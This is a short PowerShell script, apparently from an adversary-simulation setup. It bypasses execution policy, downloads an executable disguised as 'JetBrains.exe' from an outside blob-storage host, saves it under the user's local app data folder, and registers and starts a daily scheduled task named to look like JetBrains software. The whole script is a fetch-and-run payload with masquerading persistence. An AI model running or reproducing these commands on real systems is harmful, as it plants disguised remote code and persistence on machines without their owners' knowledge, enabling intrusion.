powershell.exe -NoProfile -ExecutionPolicy Bypass Invoke-WebRequest "https://offensivesimulations.blob.core.windows.net/tools/JetBrains.exe" -OutFile "$env:LOCALAPPDATA\JetBrains\JetBrains.exe"
$TaskName = "JetBrainsAutoStart"
schtasks /Create /SC DAILY /TN $TaskName /TR "`"$env:LOCALAPPDATA\JetBrains\Start.ps1`"" /ST 08:30 /F
Start-ScheduledTask -TaskName $TaskName